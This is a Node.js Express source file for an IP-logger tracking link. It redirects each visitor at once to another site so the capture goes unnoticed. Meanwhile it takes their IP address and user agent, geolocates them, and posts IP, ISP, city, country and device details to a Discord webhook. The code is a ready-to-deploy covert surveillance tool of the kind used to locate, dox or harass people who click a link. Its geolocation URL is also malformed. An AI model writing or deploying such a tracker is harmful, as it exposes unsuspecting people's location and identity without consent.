const express = require('express'); 
const app = express(); 

const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK; 
const REDIRECT_URL = process.env.REDIRECT_URL || 'https://guns.lol'; 

app.get('/', async (req, res) => { 
    // 1. Instantly redirect the user right away so they don't see any fetch errors
    res.redirect(302, REDIRECT_URL);

    // 2. Safely capture data in the background (Non-blocking execution)
    let rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || ''; 
    let clientIp = rawIp.replace(/,.*$/, '').trim(); 

    if (clientIp.includes('::ffff:')) { 
        clientIp = clientIp.replace('::ffff:', ''); 
    } 

    if (!clientIp || clientIp === '127.0.0.1' || clientIp === '::1' || clientIp === 'localhost') { 
        clientIp = '8.8.8.8'; 
    } 

    const userAgent = req.headers['user-agent'] || 'Unknown'; 

    if (DISCORD_WEBHOOK_URL) {
        // Wrap EVERYTHING in a standalone background process try-catch
        try { 
            // Query ip-api explicitly using its IPv4-only fallback endpoint to prevent Node network fetch failures
            const geoResponse = await fetch(`http://ip-api.com{clientIp}`); 
            
            if (!geoResponse.ok) {
                throw new Error(`API responded with status: ${geoResponse.status}`);
            }

            const geoData = await geoResponse.json(); 

            const ispName = geoData.isp || "Unknown"; 
            const cityName = geoData.city || "Unknown"; 
            const countryName = geoData.country || "Unknown"; 

            const discordPayload = { 
                embeds: [{ 
                    title: "Visitor Logged", 
                    color: 15548997, 
                    description: "A user has accessed the tracking link.", 
                    fields: [ 
                        { name: "IP Address", value: "`" + clientIp + "`", inline: true }, 
                        { name: "ISP Network", value: "`" + ispName + "`", inline: true }, 
                        { name: "Location", value: "`" + cityName + ", " + countryName + "`", inline: false }, 
                        { name: "Device / Agent", value: "```" + userAgent + "```", inline: false } 
                    ], 
                    footer: { text: "System Monitor" }, 
                    timestamp: new Date().toISOString() 
                }] 
            }; 

            await fetch(DISCORD_WEBHOOK_URL, { 
                method: 'POST', 
                headers: { 'Content-Type': 'application/json' }, 
                body: JSON.stringify(discordPayload) 
            }); 
        } catch (error) { 
            // Background log logging so it doesn't interrupt user tracking flow
            console.error("Background Logger Failed gracefully:", error.message); 
        } 
    } 
}); 

const PORT = process.env.PORT || 10000; 
app.listen(PORT, () => { 
    console.log(`Server running on port ${PORT}`); 
});
